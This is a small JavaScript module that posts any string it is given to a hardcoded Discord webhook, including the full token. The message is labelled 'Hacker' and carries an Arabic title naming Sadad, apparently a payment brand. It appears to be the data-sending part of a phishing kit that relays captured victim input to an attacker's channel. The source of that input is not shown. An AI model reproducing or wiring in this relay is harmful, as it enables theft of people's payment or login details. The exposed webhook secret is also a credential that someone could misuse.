import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321907033141678203/J0eCJeiSdUnuMbHvNajqTEfAHva18pNjgJsNYjP2qdeyaHJXcgc5nHkIFNTQ05dSj7nH",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
